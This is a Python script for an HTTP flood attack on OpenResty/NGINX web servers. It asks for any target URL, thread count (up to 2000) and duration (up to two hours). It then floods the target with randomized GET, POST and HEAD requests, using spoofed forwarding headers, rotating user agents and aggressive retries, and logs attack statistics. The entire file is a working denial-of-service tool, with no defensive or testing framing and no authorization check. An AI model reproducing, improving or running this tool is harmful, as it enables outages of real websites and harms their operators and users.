import requests
import threading
import time
import random
import logging
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

class OpenRestyAttack:
    def __init__(self, url, threads, duration):
        self.url = url
        self.threads = threads
        self.duration = duration
        self.user_agent = UserAgent()
        self.request_count = 0
        self.success_count = 0
        self.error_count = 0
        self.lock = threading.Lock()
        self.timeout = 2  # Reduced timeout for faster retry
        self.retry_count = 3
        self.setup_logging()
        self.setup_session()
        
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('openresty_attack.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)

    def setup_session(self):
        self.session = requests.Session()
        
        retry_strategy = Retry(
            total=self.retry_count,
            backoff_factor=0.1,  # Reduced backoff for more aggressive retries
            status_forcelist=[429, 500, 502, 503, 504]
        )
        
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=2000,  # Increased pool size
            pool_maxsize=2000,
            pool_block=False  # Non-blocking pool
        )
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)

    def generate_payload(self):
        """Generate OpenResty-specific payloads"""
        lua_specific_payloads = [
            {"ngx_var": f"value{random.randint(1,1000)}"},
            {"lua_code": f"function_{random.randint(1,1000)}"},
            {"worker_id": str(random.randint(1,32))},
            {"cache_key": f"key_{random.randint(1,10000)}"},
            {"upstream": random.choice(['backend1', 'backend2', 'backend3'])},
            {"content_type": random.choice(['json', 'html', 'plain'])},
            {"lua_module": f"module_{random.randint(1,100)}"},
            {"shared_dict": f"dict_{random.randint(1,50)}"}
        ]
        return random.choice(lua_specific_payloads)

    def generate_headers(self):
        """Generate OpenResty-optimized headers"""
        nginx_versions = ['1.19.9', '1.21.4', '1.23.3']
        openresty_versions = ['1.19.9.1', '1.21.4.1', '1.23.3.1']
        
        return {
            "User-Agent": self.user_agent.random,
            "Accept": random.choice([
                "application/json",
                "text/html,application/xhtml+xml,application/xml;q=0.9",
                "*/*"
            ]),
            "Accept-Language": random.choice([
                "en-US,en;q=0.9",
                "en-GB,en;q=0.8",
                "*"
            ]),
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": random.choice(["keep-alive", "close"]),
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "X-Real-IP": f"192.168.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Forwarded-For": f"10.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Forwarded-Proto": random.choice(["http", "https"]),
            "X-Request-ID": f"{random.randbytes(16).hex()}",
            "Server-Timing": f"cdn-cache;dur={random.randint(1,100)}",
            "Via": f"{random.choice(['1.0', '1.1'])} varnish, {random.choice(['1.0', '1.1'])} nginx",
            "X-Cache": random.choice(["HIT", "MISS"]),
            "X-OpenResty-Version": random.choice(openresty_versions),
            "X-NGINX-Version": random.choice(nginx_versions)
        }

    def _send_request(self):
        try:
            headers = self.generate_headers()
            payload = self.generate_payload()
            
            # Minimal delay between requests
            time.sleep(random.uniform(0.001, 0.05))
            
            # Randomly choose between GET, POST, and HEAD methods
            method = random.choice(['GET', 'POST', 'HEAD'])
            
            if method == 'GET':
                response = self.session.get(
                    self.url,
                    headers=headers,
                    params=payload,
                    timeout=self.timeout,
                    allow_redirects=False
                )
            elif method == 'POST':
                response = self.session.post(
                    self.url,
                    headers=headers,
                    json=payload,
                    timeout=self.timeout,
                    allow_redirects=False
                )
            else:  # HEAD
                response = self.session.head(
                    self.url,
                    headers=headers,
                    timeout=self.timeout,
                    allow_redirects=False
                )
            
            with self.lock:
                self.request_count += 1
                if response.status_code in [200, 201, 202, 204]:
                    self.success_count += 1
                    
            self.logger.debug(f"Request successful: {response.status_code}")
            return response
            
        except Exception as e:
            with self.lock:
                self.error_count += 1
            self.logger.debug(f"Request error: {str(e)}")
            return None

    def _attack_worker(self):
        end_time = time.time() + self.duration
        while time.time() < end_time:
            self._send_request()

    def run(self):
        self.logger.info(f"Starting attack on {self.url}")
        self.logger.info("Optimized for OpenResty/NGINX servers")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [
                executor.submit(self._attack_worker)
                for _ in range(self.threads)
            ]
            
        for future in futures:
            future.result()
            
        self.print_stats()

    def print_stats(self):
        """Print attack statistics"""
        self.logger.info("=== Attack Statistics ===")
        self.logger.info(f"Total Requests: {self.request_count}")
        self.logger.info(f"Successful Requests: {self.success_count}")
        self.logger.info(f"Failed Requests: {self.error_count}")
        if self.request_count > 0:
            self.logger.info(f"Success Rate: {(self.success_count/self.request_count)*100:.2f}%")
        self.logger.info(f"Requests per Second: {self.request_count/self.duration:.2f}")

def validate_input():
    while True:
        try:
            url = input("Enter target URL: ")
            if not url.startswith(('http://', 'https://')):
                print("URL must start with http:// or https://")
                continue
                
            num_threads = int(input("Enter number of threads (1-2000): "))
            if not 1 <= num_threads <= 2000:
                print("Threads must be between 1-2000")
                continue
                
            attack_duration = int(input("Enter attack duration in seconds (1-7200): "))
            if not 1 <= attack_duration <= 7200:
                print("Duration must be between 1-7200 seconds")
                continue
                
            return url, num_threads, attack_duration
        except ValueError:
            print("Invalid input. Please enter numbers for threads and duration.")

def main():
    url, threads, duration = validate_input()
    attack = OpenRestyAttack(url, threads, duration)
    attack.run()

if __name__ == "__main__":
    main() 
